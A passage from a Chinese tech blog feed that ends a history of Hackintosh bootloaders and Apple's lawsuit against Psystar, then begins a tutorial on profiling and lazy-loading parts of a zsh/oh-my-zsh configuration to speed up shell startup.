上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\">\n<div class=\"license-title\">黑苹果的历史</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-09-02</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 